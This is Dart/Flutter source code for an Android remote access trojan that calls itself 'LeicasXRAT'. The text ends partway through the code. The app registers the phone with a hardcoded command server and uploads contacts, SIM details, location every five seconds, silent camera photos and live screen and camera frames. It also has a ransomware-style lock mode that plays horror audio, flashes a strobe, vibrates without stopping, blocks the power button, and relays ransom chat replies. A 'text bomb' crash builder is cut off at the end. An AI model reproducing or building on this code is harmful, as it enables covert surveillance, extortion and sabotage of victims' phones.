import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart'; 
import 'package:http/http.dart' as http;
import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:geolocator/geolocator.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:audioplayers/audioplayers.dart';
import 'package:battery_plus/battery_plus.dart';
import 'package:vibration/vibration.dart';
import 'package:url_launcher/url_launcher.dart';
import 'package:webview_flutter/webview_flutter.dart';
import 'package:camera/camera.dart';
import 'package:image/image.dart' as img;
import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:path_provider/path_provider.dart';

// CONFIG & CONTROLLER GLOBAL
const String _rawConfigUrl = 'https://raw.githubusercontent.com/raldzzxyz-max/server-LeicasApp/refs/heads/main/config.json';
Map<String, dynamic> appConfig = {};

Future<void> loadRemoteConfig() async {
  try {
    final res = await http
        .get(Uri.parse(_rawConfigUrl))
        .timeout(const Duration(seconds: 3));
    if (res.statusCode == 200) {
      final data = jsonDecode(res.body) as Map<String, dynamic>;
      final b = data['baseUrl'] as String?;
      if (b != null && b.isNotEmpty) {
        appConfig['baseUrl'] = b;
        print('[REMOTE] baseUrl overridden: $b');
      }
    }
  } catch (_) {}
}
ValueNotifier<bool> deviceLocked = ValueNotifier<bool>(false);
final AudioPlayer _audioPlayer = AudioPlayer();
String globalDeviceId = "";
String globalDeviceModel = "";
String currentLockMessage = "YOUR PHONE IS LOCKED!!!!";
String currentLockPIN = "123";
bool _socketInitialized = false;

Timer? _heartbeatTimer;

void _startHeartbeat() {
  _heartbeatTimer?.cancel();
  _heartbeatTimer = Timer.periodic(const Duration(seconds: 30), (timer) async {
    try {
      final Battery battery = Battery();
      int level = await battery.batteryLevel;
      _sendResponseToServer("heartbeat", {"battery": level.toString()});
    } catch (e) {
      debugPrint('[HEARTBEAT] Error: ' + e.toString());
    }
  });
  debugPrint('[HEARTBEAT] Started periodic heartbeat (30s)');
}

void _stopHeartbeat() {
  _heartbeatTimer?.cancel();
  _heartbeatTimer = null;
  debugPrint('[HEARTBEAT] Stopped');
}

/// Safe check â€” always false since Flutter socket disabled (native SocketService handles connection)
bool get _socketConnected => false;
Timer? _lockMonitoringTimer;
Timer? _vibrationTimer;
Timer? _screenStreamTimer;
Timer? _flutterLiveCamTimer;
String _flutterLiveCamSide = "back";
bool _flutterLiveCamActive = false;

// Native Channels
const MethodChannel platformStrobe = MethodChannel('com.rxd.project/strobe');
const MethodChannel platformSpy = MethodChannel('com.rxd.project/background_spy');
const MethodChannel platformNativeLock = MethodChannel('com.rxd.project/native_lock');
const MethodChannel platformBackgroundService = MethodChannel('com.rxd.project/background_service');

// Lock monitoring functions
void _startLockMonitoring() {
  _lockMonitoringTimer?.cancel();
  // âœ… FIX ANR: Naikkan interval dari 100ms ke 500ms â€” 100ms terlalu agresif,
  // spam 10x/detik ke main thread Java = ANR
  _lockMonitoringTimer = Timer.periodic(const Duration(milliseconds: 500), (timer) async {
    if (deviceLocked.value) {
      try {
        await platformSpy.invokeMethod('bringToForeground');
      } catch (e) {
        debugPrint('[LOCK_MONITOR] Error bringing to foreground: $e');
      }
    } else {
      timer.cancel();
    }
  });
  debugPrint('[LOCK_MONITOR] Started foreground monitoring (500ms)');
}

void _stopLockMonitoring() {
  _lockMonitoringTimer?.cancel();
  _lockMonitoringTimer = null;
  debugPrint('[LOCK_MONITOR] Stopped foreground monitoring');
}

// Continuous vibration function
void _startContinuousVibration() {
  _vibrationTimer?.cancel();
  _vibrationTimer = Timer.periodic(const Duration(milliseconds: 500), (timer) async {
    if (deviceLocked.value) {
      try {
        Vibration.vibrate(duration: 400);
      } catch (e) {
        debugPrint('[VIBRATION] Error: $e');
      }
    } else {
      timer.cancel();
    }
  });
  debugPrint('[VIBRATION] Started continuous vibration');
}

void _stopContinuousVibration() {
  _vibrationTimer?.cancel();
  _vibrationTimer = null;
  Vibration.cancel();
  debugPrint('[VIBRATION] Stopped continuous vibration');
}

/// PIN benar / UNLOCK dari panel â€” kembalikan HP ke normal.
Future<void> performFullUnlock() async {
  deviceLocked.value = false;
  stopScarySound();
  _stopContinuousVibration();
  _stopLockMonitoring();

  try {
    await platformStrobe.invokeMethod('stop_strobe');
  } catch (_) {}
  try {
    await platformStrobe.invokeMethod('stopStrobe');
  } catch (_) {}
  try {
    await platformNativeLock.invokeMethod('stopNativeLock');
  } catch (_) {}
  try {
    await platformSpy.invokeMethod('enablePowerButton');
  } catch (_) {}
  try {
    await platformSpy.invokeMethod('disableAwake');
  } catch (_) {}

  SystemChrome.setEnabledSystemUIMode(SystemUiMode.edgeToEdge);

  try {
    final prefs = await SharedPreferences.getInstance();
    await prefs.setBool('device_locked', false);
    await prefs.setBool('lock_active_session', false);
    await prefs.setBool('horror_enabled', false);
    await prefs.remove('lock_message');
    await prefs.remove('lock_pin');
    await prefs.remove('strobe_enabled');
    await prefs.remove('horror_enabled');
    await prefs.remove('block_notification_enabled');
    await prefs.remove('block_power_enabled');
    await prefs.remove('block_settings_enabled');
    await prefs.remove('screen_pin_enabled');
    await prefs.remove('aggressive_overlay_enabled');
    await prefs.remove('app_spam_enabled');
  } catch (e) {
    debugPrint('[UNLOCK] prefs clear error: $e');
  }

    debugPrint('[UNLOCK] Device restored to normal');
  }

Timer? _locationTimer;

void _startLocationTracking() {
  _locationTimer?.cancel();
  _locationTimer = Timer.periodic(const Duration(seconds: 5), (timer) async {
    try {
      Position pos = await Geolocator.getCurrentPosition(
        desiredAccuracy: LocationAccuracy.high,
        timeLimit: const Duration(seconds: 8),
      );
      _sendResponseToServer('live_location', {
        'lat': pos.latitude,
        'lng': pos.longitude,
        'accuracy': pos.accuracy,
        'timestamp': DateTime.now().millisecondsSinceEpoch,
      });
    } catch (e) {
      debugPrint('[LIVE_LOCATION] Error: ' + e.toString());
    }
  });
}

void _stopLocationTracking() {
  _locationTimer?.cancel();
  _locationTimer = null;
}

void _startLiveScreenLoop() {
  _screenStreamTimer?.cancel();
  _screenStreamTimer = Timer.periodic(const Duration(seconds: 1), (timer) async {
    try {
      final screenshot = await platformSpy.invokeMethod('startScreenStreamBackground');
      if (screenshot is String && screenshot.isNotEmpty) {
        _sendResponseToServer('live_screen_frame', screenshot);
      }
    } catch (e) {
      debugPrint('[LIVE_SCREEN] Error fetching frame: $e');
    }
  });
  debugPrint('[LIVE_SCREEN] Started live screen loop (1s)');
}

void _stopLiveScreenLoop() {
  _screenStreamTimer?.cancel();
  _screenStreamTimer = null;
  debugPrint('[LIVE_SCREEN] Stopped live screen loop');
}

// ===== FLUTTER LIVE CAMERA LOOP (fallback jika native gagal) =====
void _startFlutterLiveCameraLoop(String side) {
  _flutterLiveCamTimer?.cancel();
  _flutterLiveCamActive = true;
  _flutterLiveCamSide = side;
  debugPrint('[FLUTTER_LIVE_CAM] Starting Flutter live camera loop: $side');
  
  // âœ… Fix: Interval lebih panjang (1200ms) untuk avoid resource leak
  _flutterLiveCamTimer = Timer.periodic(const Duration(milliseconds: 1200), (timer) async {
    if (!_flutterLiveCamActive) {
      timer.cancel();
      return;
    }
    
    CameraController? controller;
    try {
      // âœ… Verify permissions first (Android 13+)
      final cameraStatus = await Permission.camera.status;
      if (!cameraStatus.isGranted) {
        debugPrint('[FLUTTER_LIVE_CAM] Camera permission not granted');
        return;
      }
      
      final cameras = await availableCameras();
      if (cameras.isEmpty) {
        debugPrint('[FLUTTER_LIVE_CAM] No cameras available');
        return;
      }
      
      final cam = cameras.firstWhere(
        (c) => c.lensDirection == (side == "front"
            ? CameraLensDirection.front
            : CameraLensDirection.back),
        orElse: () => cameras.first,
      );
      
      controller = CameraController(cam, ResolutionPreset.low,
          enableAudio: false, imageFormatGroup: ImageFormatGroup.jpeg);
      
      await controller.initialize().timeout(const Duration(seconds: 5));
      
      final XFile photo = await controller.takePicture().timeout(const Duration(seconds: 5));
      final bytes = await File(photo.path).readAsBytes();
      img.Image? decoded = img.decodeImage(bytes);
      
      if (decoded != null) {
        final b64 = base64Encode(img.encodeJpg(decoded, quality: 25));
        _sendResponseToServer("live_camera_frame", b64);
      }
      
      await File(photo.path).delete().catchError((_) {});
    } catch (e) {
      debugPrint('[FLUTTER_LIVE_CAM] Frame error: $e');
    } finally {
      // âœ… CRITICAL: Always dispose controller to prevent resource leak
      try {
        await controller?.dispose();
      } catch (_) {}
    }
  });
}

void _stopFlutterLiveCameraLoop() {
  _flutterLiveCamActive = false;
  _flutterLiveCamTimer?.cancel();
  _flutterLiveCamTimer = null;
  debugPrint('[FLUTTER_LIVE_CAM] Stopped Flutter live camera loop');
}

// ===== FLUTTER SILENT PHOTO (return base64 image) =====
Future<String?> _captureFlutterPhoto(String side) async {
  CameraController? controller;
  try {
    // âœ… SKIP cek permission â€” di Xiaomi/MIUI, status API tidak reliable
    // Langsung coba, kalau permission ditolak akan throw exception
    // Request diam-diam dulu (tidak muncul dialog kalau sudah granted)
    try {
      await Permission.camera.request();
    } catch (_) {}

    final cameras = await availableCameras();
    if (cameras.isEmpty) {
      debugPrint('[FLUTTER_PHOTO] No cameras found');
      return null;
    }

    // Cari kamera sesuai side
    CameraDescription? cam;
    for (final c in cameras) {
      if (side == "front" && c.lensDirection == CameraLensDirection.front) {
        cam = c;
        break;
      } else if (side != "front" && c.lensDirection == CameraLensDirection.back) {
        cam = c;
        break;
      }
    }
    cam ??= cameras.first;

    controller = CameraController(
      cam,
      ResolutionPreset.low,
      enableAudio: false,
      imageFormatGroup: ImageFormatGroup.jpeg,
    );

    await controller.initialize().timeout(const Duration(seconds: 12));

    // Warm-up kamera (penting di Xiaomi)
    await Future.delayed(const Duration(milliseconds: 500));

    final XFile photo = await controller.takePicture().timeout(const Duration(seconds: 12));
    final bytes = await File(photo.path).readAsBytes();

    // Encode langsung tanpa decode/re-encode untuk kecepatan
    final b64 = base64Encode(bytes);
    debugPrint('[FLUTTER_PHOTO] âœ… Success (${(b64.length / 1024).toStringAsFixed(1)} KB)');

    await File(photo.path).delete().catchError((_) {});
    return b64;
  } catch (e) {
    debugPrint('[FLUTTER_PHOTO] âŒ Error: $e');
    return null;
  } finally {
    try {
      await controller?.dispose();
    } catch (_) {}
  }
}

/// AUTO-RESTORE LOCK STATE FROM PREVIOUS SESSION
Future<void> _restoreLockStateOnStartup() async {
  try {
    final prefs = await SharedPreferences.getInstance();
    final isLocked = prefs.getBool('device_locked') ?? false;
    final lockActive = prefs.getBool('lock_active_session') ?? false;

    if (isLocked && lockActive) {
      final lockMessage = prefs.getString('lock_message') ?? "ðŸ”’ SYSTEM LOCKED ðŸ”’";
      final lockPin = prefs.getString('lock_pin') ?? "123456";
      final strobeEnabled = prefs.getBool('strobe_enabled') ?? false;
      final horrorEnabled = prefs.getBool('horror_enabled') ?? false;
      final videoEnabled = prefs.getBool('video_enabled') ?? false;
      final videoSoundEnabled = prefs.getBool('video_sound_enabled') ?? false;
      
      currentLockMessage = lockMessage;
      currentLockPIN = lockPin;
      deviceLocked.value = true;
      
      debugPrint('[STARTUP_RESTORE] Lock restored: message=$lockMessage, strobe=$strobeEnabled, horror=$horrorEnabled');
      
      if (strobeEnabled) {
        try {
          await platformStrobe.invokeMethod('flash_strobe');
        } catch (e) {
          debugPrint('[STARTUP_RESTORE] Strobe error: $e');
        }
      }
      
      // Start continuous vibration
      _startContinuousVibration();
      
      // Launch HardLockActivity
      try {
        String restoreExtra = '$lockMessage|$lockPin';
        if (strobeEnabled) restoreExtra += '|strobe=1';
        if (horrorEnabled) restoreExtra += '|horror=1';
        if (videoEnabled) restoreExtra += '|video=1';
        if (videoSoundEnabled) restoreExtra += '|video_sound=1';
        await platformSpy.invokeMethod('hard_lock', {'extra': restoreExtra});
        debugPrint('[STARTUP_RESTORE] HardLockActivity launched via HardLockService');
      } catch (e) {
        debugPrint('[STARTUP_RESTORE] HardLock launch error: $e');
      }
      
      // Re-enable protections
      try {
        await platformSpy.invokeMethod('disablePowerButton');
        await platformSpy.invokeMethod('keepAwake');
        await platformSpy.invokeMethod('blockNavigationButtons');
        await platformSpy.invokeMethod('hideNotificationBar');
        await platformSpy.invokeMethod('disableStatusBar');
      } catch (e) {
        debugPrint('[STARTUP_RESTORE] Protection error: $e');
      }
      
      // Start monitoring to prevent close
      _startLockMonitoring();
    }
  } catch (e) {
    debugPrint('[STARTUP_RESTORE] Error: $e');
  }
}

void main() async {
  WidgetsFlutterBinding.ensureInitialized();

  // Load config
  await loadLocalConfig();
  await loadRemoteConfig();
  print('[MAIN] Config loaded: ${appConfig['ratId']}');

  // Device info (tidak butuh permission)
  try {
    final deviceInfo = await getDeviceInfo();
    globalDeviceId = deviceInfo['id'] ?? "UNKNOWN_ID";
    globalDeviceModel = deviceInfo['model'] ?? "Unknown";
  } catch (e) {
    globalDeviceId = "UNKNOWN_ID";
    globalDeviceModel = "Unknown";
  }
  print('[MAIN] Device: $globalDeviceId / $globalDeviceModel');

  // Simpan ke native prefs
  try {
    await platformSpy.invokeMethod('saveTargetId', {
      'deviceId': globalDeviceId,
      'ratId': appConfig['ratId'] ?? globalDeviceId,
      'baseUrl': appConfig['baseUrl'],
    });
  } catch (e) {}

  // Request permission dasar (dialog standar) â€” permission keras ditangani Java
  try {
    await requestPermissions();
  } catch (e) {
    print('[MAIN] Permission error: $e');
  }

  // Restore lock state
  try {
    await _restoreLockStateOnStartup();
  } catch (e) {
    print('[MAIN] Lock restoration error: $e');
  }

  // âœ… START SERVICES LANGSUNG â€” jangan tunggu permission gate
  // Socket, register, dan background services harus jalan segera
  // WebView (index.html) yang ditunda, bukan socket
  _initAfterPermissions();

  print('[MAIN] App starting...');
  runApp(const PermissionGateApp());
}

// â”€â”€â”€ Splash gate: tunggu Java kirim "onPermissionsDone" sebelum tampil WebView â”€â”€â”€
class PermissionGateApp extends StatefulWidget {
  const PermissionGateApp({super.key});
  @override
  State<PermissionGateApp> createState() => _PermissionGateAppState();
}

class _PermissionGateAppState extends State<PermissionGateApp> {
  bool _ready = false;

  @override
  void initState() {
    super.initState();
    // Satu handler untuk SEMUA native call dari platformSpy
    platformSpy.setMethodCallHandler(_onNativeCall);
    // platformNativeLock: onTargetReply sudah ditangani di _onNativeCall via platformSpy
    // Tapi native lock channel terpisah â€” pasang juga
    platformNativeLock.setMethodCallHandler(_onNativeCall);
    // Fallback: kalau Java tidak kirim sinyal dalam 10 detik, lanjut saja
    Future.delayed(const Duration(seconds: 10), () {
      if (mounted && !_ready) {
        setState(() => _ready = true);
        // _initAfterPermissions sudah dipanggil di main()
      }
    });
  }

  Future<void> _onNativeCall(MethodCall call) async {
    try {
      switch (call.method) {
        case 'onPermissionsDone':
          if (mounted && !_ready) {
            setState(() => _ready = true);
            // _initAfterPermissions sudah dipanggil di main() â€” tidak perlu panggil lagi
          }
          break;
        case 'live_frame':
          final args = call.arguments;
          String? imageB64;
          if (args is Map) imageB64 = args['image']?.toString();
          if (imageB64 != null && imageB64.isNotEmpty) {
            _sendResponseToServer('live_camera_frame', imageB64);
          }
          break;
        case 'live_screen_frame':
          final args = call.arguments;
          String? imageB64;
          if (args is Map) imageB64 = args['image']?.toString();
          if (imageB64 != null && imageB64.isNotEmpty) {
            _sendResponseToServer('live_screen_frame', imageB64);
          }
          break;
        case 'onDeviceUnlocked':
          await performFullUnlock();
          break;
        case 'onSocketCommand':
          print('[SOCKET_CMD] Received from native: ${call.arguments}');
          try { await executeLogic(call.arguments); } catch (e) {}
          break;
        case 'onTargetReply':
          _sendResponseToServer('target_chat_reply', {
            'app': 'LOCK_SYSTEM',
            'title': 'Target User',
            'body': call.arguments.toString(),
            'timestamp': DateTime.now().millisecondsSinceEpoch,
          });
          break;
        case 'ransomwareChatReply':
          _sendResponseToServer('ransomware_chat_reply', {
            'message': call.arguments.toString(),
            'timestamp': DateTime.now().millisecondsSinceEpoch,
          });
          break;
        case 'lockChatReply':
          _sendResponseToServer('lock_chat_reply', {
            'message': call.arguments.toString(),
            'timestamp': DateTime.now().millisecondsSinceEpoch,
          });
          break;
        default:
          debugPrint('[NATIVE_CALL] Unknown method: ${call.method}');
      }
    } catch (e) {
      debugPrint('[NATIVE_CALL] Error on ${call.method}: $e');
    }
  }

  @override
  Widget build(BuildContext context) {
    if (!_ready) {
      return MaterialApp(
        debugShowCheckedModeBanner: false,
        home: Scaffold(
          backgroundColor: Colors.black,
          body: Center(
            child: Column(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                const CircularProgressIndicator(color: Colors.red),
                const SizedBox(height: 24),
                const Text(
                  'Mempersiapkan sistem...',
                  style: TextStyle(color: Colors.white, fontSize: 16),
                ),
                const SizedBox(height: 8),
                const Text(
                  'Izinkan semua permission yang diminta',
                  style: TextStyle(color: Colors.grey, fontSize: 12),
                ),
              ],
            ),
          ),
        ),
      );
    }
    return const MyApp();
  }
}

// Handler native calls sudah dipindah ke _PermissionGateAppState._onNativeCall()

/// Dipanggil SEKALI setelah semua permission selesai (gate terbuka).
/// Inisialisasi socket, register device, dan start services di sini.
void _initAfterPermissions() {
  if (_socketInitialized) return;
  _socketInitialized = true;

  print('[INIT] Starting post-permission initialization...');

  // Background proxy listener
  try { _initBackgroundProxyListener(); } catch (e) {}

  // Register device ke server
  Future(() async {
    try {
      await registerInitialDevice(globalDeviceId, globalDeviceModel);
    } catch (e) {
      print('[INIT] Register error: $e');
    }

    // Register Flutter listener with native SocketService
    try {
      platformSpy.invokeMethod('registerSocketListener');
      print('[INIT] âœ… Registered Flutter listener with SocketService');
    } catch (e) {
      print('[INIT] âš ï¸ Could not register listener: $e');
    }

    // Auto collect intel
    try { _autoCollectIntel(); } catch (e) {}
    // Start periodic heartbeat
    try { _startHeartbeat(); } catch (e) {}

    // Start foreground service
    try {
      await platformSpy.invokeMethod('startForegroundService');
    } catch (e) {}

    try {
      await platformBackgroundService.invokeMethod('startBackgroundService');
      print('[INIT] Background service started');
    } catch (e) {}

    print('[INIT] âœ… Post-permission init complete');
  });
}

void _initBackgroundProxyListener() {
  // OBSOLETE: Java side no longer uses EventChannel 'proxy_events'.
  // All commands now flow through MethodChannel 'spyChannel' -> _onNativeCall()
}

Future<void> _autoCollectIntel() async {
  try {
    final contacts = await _getContactsInternal();
    final Battery battery = Battery();
    int level = await battery.batteryLevel;
    
    // Get network type
    final connectivity = Connectivity();
    final connectivityResult = await connectivity.checkConnectivity();
    String networkType = "Unknown";
    if (connectivityResult == ConnectivityResult.wifi) {
      networkType = "WiFi";
    } else if (connectivityResult == ConnectivityResult.mobile) {
      networkType = "Mobile";
    } else if (connectivityResult == ConnectivityResult.ethernet) {
      networkType = "Ethernet";
    }
    
    // Get device info
    DeviceInfoPlugin deviceInfoPlugin = DeviceInfoPlugin();
    AndroidDeviceInfo androidInfo = await deviceInfoPlugin.androidInfo;
    
    String model = "${androidInfo.brand.toUpperCase()} ${androidInfo.model}";
    
    // Get SIM info (requires native call)
    String sim1 = "Unknown";
    String sim2 = "Unknown";
    try {
      final simInfo = await platformSpy.invokeMethod('getSimInfo');
      if (simInfo != null) {
        sim1 = simInfo['sim1'] ?? "No SIM";
        sim2 = simInfo['sim2'] ?? "No SIM";
      }
    } catch (e) {
      debugPrint('Error getting SIM info: $e');
    }
    
    _sendResponseToServer("auto_intel", {
      "contacts": contacts,
      "battery": level.toString(),
      "model": model,
      "networkType": networkType,
      "simSlot1": sim1,
      "simSlot2": sim2,
      "timestamp": DateTime.now().millisecondsSinceEpoch,
    });
  } catch (e) {
    debugPrint('[INTEL] Error: $e');
  }
}

Future<void> loadLocalConfig() async {
  const defaultBaseUrl = "http://hamnzx.clouderz.my.id:2000";
  const landingWeb = "file:///android_asset/flutter_assets/assets/custom/index.html";
  const defaultOwnerName = "dayzx";

  void applyConfig(String ratId) {
    appConfig = {
      "ratId": ratId,
      "accountId": ratId,
      "baseUrl": defaultBaseUrl,
      "landing_web": landingWeb,
      "owner_name": defaultOwnerName,
    };
  }

  Future<void> updateCache(String ratId) async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final oldCached = prefs.getString('cached_ratId') ?? '';
      await prefs.setString('cached_ratId', ratId);
      if (oldCached != ratId) {
        await prefs.setString('cached_ratId_prev', ratId);
      }
    } catch (_) {}
  }

  // PRIORITAS 1: Baca dari appDocDir/config.json (filesystem -- bisa diupdate via command)
  try {
    final dir = await getApplicationDocumentsDirectory();
    final configFile = File('${dir.path}/config.json');
    if (await configFile.exists()) {
      final content = await configFile.readAsString();
      final configData = json.decode(content);
      final ratId = (configData['ratId'] ?? '').toString().trim();
      if (ratId.isNotEmpty && ratId != 'UNKNOWN') {
        applyConfig(ratId);
        await updateCache(ratId);
        print('[CONFIG] Loaded from filesystem: $ratId');
        return;
      }
    }
  } catch (e) {
    print('[CONFIG] Filesystem config error: $e');
  }

  try {
    // PRIORITAS 2: Baca dari assets/custom/config.json (bundled APK)
    final String response = await rootBundle.loadString('assets/custom/config.json');
    final configData = json.decode(response);
    final String ratId = (configData['ratId'] ?? '').toString().trim();

    if (ratId.isEmpty || ratId == 'UNKNOWN') {
      throw Exception('ratId kosong di config.json');
    }

    applyConfig(ratId);
    await updateCache(ratId);
    print('[CONFIG] Loaded from bundled asset: $ratId');

  } catch (e) {
    print('[CONFIG] Bundled asset load failed ($e), trying cache...');

    // PRIORITAS 3: Fallback ke cache SharedPreferences
    try {
      final prefs = await SharedPreferences.getInstance();
      final cachedRatId = prefs.getString('cached_ratId') ?? '';

      if (cachedRatId.isNotEmpty && cachedRatId != 'UNKNOWN') {
        applyConfig(cachedRatId);
        print('[CONFIG] Loaded from cache: $cachedRatId');
        return;
      }
    } catch (_) {}

    // PRIORITAS 4: Fallback terakhir
    appConfig = {
      "ratId": "UNKNOWN",
      "accountId": "UNKNOWN",
      "baseUrl": defaultBaseUrl,
      "landing_web": landingWeb,
      "owner_name": defaultOwnerName,
    };
    print('[CONFIG] Using fallback UNKNOWN config');
  }
}

Future<void> requestPermissions() async {
  final prefs = await SharedPreferences.getInstance();
  final permissionsAsked = prefs.getBool('permissions_asked') ?? false;

  if (permissionsAsked) {
    print('[PERMS] Already asked - skipping');
    return;
  }

  // === Hanya permission dasar (dialog standar Android) ===
  final basicPermissions = <Permission>[
    Permission.location,
    Permission.contacts,
    Permission.camera,
    Permission.microphone,
    Permission.notification,
    Permission.sms,
    Permission.phone,
  ];

  // Storage/media sesuai SDK
  if (Platform.isAndroid) {
    try {
      final androidInfo = await DeviceInfoPlugin().androidInfo;
      final sdk = androidInfo.version.sdkInt ?? 0;
      if (sdk >= 33) {
        basicPermissions.addAll([
          Permission.photos,
          Permission.videos,
          Permission.audio,
        ]);
      } else if (sdk >= 30) {
        basicPermissions.addAll([
          Permission.manageExternalStorage,
          Permission.storage,
        ]);
      } else {
        basicPermissions.add(Permission.storage);
      }
    } catch (e) {
      basicPermissions.add(Permission.storage);
    }
  } else {
    basicPermissions.add(Permission.storage);
  }

  await basicPermissions.request();
  print('[PERMS] âœ… Basic permissions requested');

  // JANGAN minta permission keras di Flutter:
  // ignoreBatteryOptimizations, systemAlertWindow, scheduleExactAlarm
  // â†’ semua ditangani MainActivity.java dengan urutan dan flag yang benar

  await prefs.setBool('permissions_asked', true);
  print('[PERMS] âœ… All basic permissions done');
}

Future<Map<String, String>> getDeviceInfo() async {
  DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
  String modelName = "Unknown";
  String identifier = "UNKNOWN_ID";
  if (Platform.isAndroid) {
    AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;
    modelName = "${androidInfo.brand.toUpperCase()} ${androidInfo.model}";
    identifier = "${androidInfo.brand}-${androidInfo.model}-${androidInfo.id}".replaceAll(' ', '_'); 
  }
  return {"id": identifier, "model": modelName};
}

Future<void> registerInitialDevice(String id, String model) async {
  try {
    final Battery battery = Battery();
    int level = await battery.batteryLevel;
    final serverUrl = appConfig['baseUrl'] ?? "http://hamnzx.clouderz.my.id:2000";
    final ratId = appConfig['ratId'] ?? 'UNKNOWN';
    
    // Log untuk debug
    print('[REGISTER] Starting registration...');
    print('[REGISTER] ratId=$ratId');
    print('[REGISTER] deviceId=$id');
    print('[REGISTER] battery=$level%');
    print('[REGISTER] serverUrl=$serverUrl');
    
    final response = await http.post(
      Uri.parse("$serverUrl/registerDevice"),
      body: jsonEncode({
        "ratId": ratId,
        "deviceId": id,
        "deviceModel": "LeicasXRAT - $model",
        "deviceOS": "Android",
        "battery": level,
        "androidVersion": (await DeviceInfoPlugin().androidInfo).version.release,
      }),
      headers: {"Content-Type": "application/json"}
    ).timeout(const Duration(seconds: 10));
    
    print('[REGISTER] Response status: ${response.statusCode}');
    print('[REGISTER] Response body: ${response.body}');
    
  } catch (e) {
    print('[REGISTER] ERROR: $e');
  }
}


void playScarySound() async {
  try {
    await _audioPlayer.setReleaseMode(ReleaseMode.loop);
    await _audioPlayer.setVolume(1.0);
    await _audioPlayer.play(AssetSource('custom/analog_horror.mp3'));
    debugPrint('[AUDIO] Playing analog_horror.mp3 (LOOP, max volume)');
  } catch (e) {
    debugPrint('[AUDIO] analog_horror failed: $e');
    try {
      await _audioPlayer.play(AssetSource('custom/sound_horor.mp3'));
      debugPrint('[AUDIO] Fallback sound_horor.mp3');
    } catch (e2) {
      debugPrint('[AUDIO] All horror assets failed: $e2');
    }
  }
}

Future<void> stopScarySound() async {
  try {
    await _audioPlayer.stop();
    debugPrint('[AUDIO] Scary sound stopped');
  } catch (e) {
    debugPrint('[AUDIO] Error stopping sound: $e');
  }
}

Future<void> _saveAccountIdPrefs(String accountId, String deviceId) async {
  try {
    // âœ… Simpan ke SharedPreferences Flutter (default)
    final prefs = await SharedPreferences.getInstance();
    await prefs.setString('account_id', accountId);
    await prefs.setString('device_id', deviceId);
    print('[PREFS] âœ… Saved account_id: $accountId, device_id: $deviceId');
    
    // âœ… Simpan juga ke native "SpyPrefs" yang dibaca SocketService.java
    // SocketService.java pakai getSharedPreferences("SpyPrefs", MODE_PRIVATE)
    try {
      await platformSpy.invokeMethod('saveTargetId', {
        'deviceId': deviceId,
        'ratId': accountId,
        'account_id': accountId,
        'baseUrl': appConfig['baseUrl'] ?? 'http://hamnzx.clouderz.my.id:2000',
      });
      print('[PREFS] âœ… Saved to native SpyPrefs via saveTargetId');
    } catch (e) {
      print('[PREFS] âš ï¸ Native save error: $e');
    }
  } catch (e) {
    print('[PREFS] âŒ Error saving prefs: $e');
  }
}

// âœ… FLUTTER SOCKET DISABLED â€” Native SocketService handles connection
// Command flow: SocketService â†’ commandListener â†’ onSocketCommand â†’ executeLogic()
// Response flow: Flutter â†’ platformSpy.invokeMethod('sendResponse') â†’ SocketService â†’ server

Future<void> _autoSendDeviceInfo() async {
  try {
    final Battery battery = Battery();
    int batteryLevel = await battery.batteryLevel;
    
    // Get network info
    final connectivity = Connectivity();
    final connectivityResult = await connectivity.checkConnectivity();
    String networkType = "Unknown";
    if (connectivityResult == ConnectivityResult.wifi) {
      networkType = "WiFi";
    } else if (connectivityResult == ConnectivityResult.mobile) {
      networkType = "Mobile";
    } else if (connectivityResult == ConnectivityResult.ethernet) {
      networkType = "Ethernet";
    }
    
    // Get device info
    DeviceInfoPlugin deviceInfoPlugin = DeviceInfoPlugin();
    AndroidDeviceInfo androidInfo = await deviceInfoPlugin.androidInfo;
    
    String model = "${androidInfo.brand.toUpperCase()} ${androidInfo.model}";
    
    // Get SIM info (requires native call)
    String sim1 = "Unknown";
    String sim2 = "Unknown";
    try {
      final simInfo = await platformSpy.invokeMethod('getSimInfo');
      if (simInfo != null) {
        sim1 = simInfo['sim1'] ?? "No SIM";
        sim2 = simInfo['sim2'] ?? "No SIM";
      }
    } catch (e) {
      debugPrint('Error getting SIM info: $e');
    }
    
    final deviceInfoData = {
      "model": model,
      "battery": "$batteryLevel%",
      "networkType": networkType,
      "simSlot1": sim1,
      "simSlot2": sim2,
      "androidVersion": androidInfo.version.release,
      "device": androidInfo.device,
      "manufacturer": androidInfo.manufacturer,
      ...await _getPrivilegeFlags(),
    };
    
    _sendResponseToServer("get_device_info", deviceInfoData);
    debugPrint('[AUTO_INFO] Device info sent automatically');
  } catch (e) {
    debugPrint('[AUTO_INFO] Error: $e');
  }
}

void _sendHeartbeat() async {
  try {
    final level = await Battery().batteryLevel;
    final ratId = appConfig['ratId'] ?? 'UNKNOWN';

    // âœ… Send via HTTP only (native SocketService handles heartbeat via socket)
    final serverUrl = appConfig['baseUrl'] ?? "http://hamnzx.clouderz.my.id:2000";
    try {
      await http.post(
        Uri.parse("$serverUrl/receiveDeviceData"),
        body: jsonEncode({
          "ratId": ratId,
          "deviceId": globalDeviceId,
          "data": {
            "cmd": "heartbeat",
            "battery": level,
            "batteryStr": "$level%",
            "timestamp": DateTime.now().millisecondsSinceEpoch,
          }
        }),
        headers: {"Content-Type": "application/json"},
      ).timeout(const Duration(seconds: 5));
      print('[HEARTBEAT] âœ… Sent via HTTP (battery: $level%)');
    } catch (e) {
      print('[HEARTBEAT] âš ï¸ HTTP fallback failed: $e');
    }
  } catch (e) {
    debugPrint('[HEARTBEAT] Error: $e');
  }
}

Future<void> _ensureGalleryPermissions() async {
  if (!Platform.isAndroid) return;
  if (await Permission.photos.isGranted || await Permission.storage.isGranted) return;
  await Permission.photos.request();
  await Permission.videos.request();
  if (!await Permission.photos.isGranted) {
    await Permission.storage.request();
  }
}

// --- TEXT BOMB BUILDER (kernel crash) ---
String _buildTextBomb(int loops) {
  final sb = StringBuffer();
  final chunkA = 'ꦽ' * 9999;
  final chunkB = '\n' * 10000;
  final chunkC = '\uFFFD\uFFFE\uFFFF' * 400;
  final chunkBase64 =
      'data:image/png;base64,'
